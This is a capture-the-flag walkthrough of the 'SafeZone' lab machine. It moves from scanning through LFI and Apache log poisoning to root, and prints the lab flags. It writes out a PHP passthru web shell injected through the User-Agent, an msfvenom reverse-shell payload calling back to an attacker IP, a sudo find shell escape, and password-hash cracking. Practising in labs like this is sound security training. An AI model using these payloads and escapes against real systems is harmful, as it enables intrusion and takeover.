> SafeZone

# Rustscan

rustscan -a $IP --ulimit=5000 -b 4500 -- -sC -sV -Pn -A

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Whoami?
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,bak,tar,rar,zip,cgi,bin

```
/index.php (Status: 200)
/news.php (Status: 302)
/register.php (Status: 200)
/detail.php (Status: 302)
/logout.php (Status: 200)
/dashboard.php (Status: 302)
/note.txt (Status: 200)
```

## note.txt

```
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

Using register.php we can create a temp account. In news.php we can find a message `I have something to tell you , it's about LFI or is it RCE or something else?`. And details.php says we can't access this feature. In detail.php we can find that we have a comment line `<!-- try to use "page" as GET parameter-->`.

But with the above hint I tried many things and couldn't get a result. So next we know that it is a apache server and has a setting where it includes home directories in it’s file system, accessible through `~/[Name of User]`.  Accessing `http://safezone.thm/~files/pass.txt` got us a message. 

## pass.txt

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

Copied a small script and found the password. `admin44admin`. Now accessing `details.php` we get access and a text box, which asks us usernames and tells about them linke username, password. And already we got a message about details.php about LFI and page as a GET parameter. Aceesing `safezone.thm/details.php?page=/etc/passswd` gives us LFI.

Let's try accessing apache log file.

## URL: http://10.10.126.25/detail.php?page=/var/log/apache2/access.log

And we can access the logs. Let's try to cache poison. Capture the request in Burp. Let's change user-agent to 
`User-Agent: <?php passthru($_REQUEST['cmd']); ?>`. And then we can refresh the page and execute any command. Next resend it in burp and execute command in browser.

Now we can pass shell.php to attacking machine using wget and using page parameter we can navigat to the shell location and gain a reverse shell!!

# sudo -l

```
User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

## Reverse shell

`sudo -u files find . -exec /bin/sh \; -quit` 

And we are in as files! We got a hidden file in `files` directory. 

## .something#fake_can@be^here

```
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

# Cracking using john

john hash -wordlist=/usr/share/wordlists/rockyou.txt

```
magic
```

Let's SSH into files. Looking through the system we got an interesting port internally running.

ss -tulpn

```
NetidState  Recv-Q Send-Q        Local Address:Port   Peer Address:Port 
udp  UNCONN 0      0             127.0.0.53%lo:53          0.0.0.0:*    
udp  UNCONN 0      0         10.10.126.25%eth0:68          0.0.0.0:*    
tcp  LISTEN 0      128           127.0.0.53%lo:53          0.0.0.0:*    
tcp  LISTEN 0      128                 0.0.0.0:22          0.0.0.0:*    
tcp  LISTEN 0      128               127.0.0.1:8000        0.0.0.0:*     => 🐛
tcp  LISTEN 0      80                127.0.0.1:3306        0.0.0.0:*    
tcp  LISTEN 0      128                       *:80                *:*    
tcp  LISTEN 0      128                    [::]:22             [::]:* 
```


Let's port forward and get access to the server. 

ssh -L 2222:127.0.0.1:8000 files@<IP>

**Note: Add socks5 127.0.0.1 2222 in /etc/proxychains4.conf**

But when we access `127.0.0.1:2222` it gives us a 403 error.

# Enumeration.....Again

gobuster dir -u http://127.0.0.1:2222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/internal_8000 -x txt,php,sql,bak,zip,js,bin,cgi,tar

```
/login.js (Status: 200)
/pentest.php (Status: 200)
```

And pentest.php definitely has a filter and blocks some words.Let's try for blind code injection. Looks like we can user curl. Let's create a msfvenom payload and pass it through scp.

## Payload

1. msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.107.21 LPORT=4444 -f elf > shell => Payload created!!!
2. scp shell files@safezone.thm:/tmp/

## In browser

In pentest.php, we access `tmp/shell` by typing it in the text box. And we are in as Yash!!

# user.txt

```
THM{c296539f3286a899d8b3f6632fd62274}
```

# Priv-Esc

## sudo -l

```
User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

Looks like this py file copies the contents of file from one location to another and persists the permissions. Let's try to copy every contents of root to yash's directory.

# Executing bk.py

sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/*
Enter destination: /home/yash/
Enter Password: 123

**Observation: If we didn't provide any password `Usage: sshpass [-f|-d|-p|-e] [-hV] command parameters`**

# root.txt

```
63a9f0ea7bb98050796b649e85481845
```